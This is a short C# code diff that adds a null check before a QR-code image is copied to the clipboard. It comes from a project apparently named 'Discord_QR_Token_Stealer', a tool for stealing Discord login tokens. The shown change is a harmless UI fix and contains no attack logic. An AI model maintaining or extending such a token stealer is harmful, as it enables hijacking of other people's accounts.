@@ -245,6 +245,10 @@ namespace Discord_QR_Token_Stealer
         // clicking on side image
         private void currentCode_Click(object sender, EventArgs e)
         {
+            // make sure its not just null
+            if (currentCode.Image == null)
+                return;
+
             // copying to clipboard
             Clipboard.SetImage(currentCode.Image);
         }
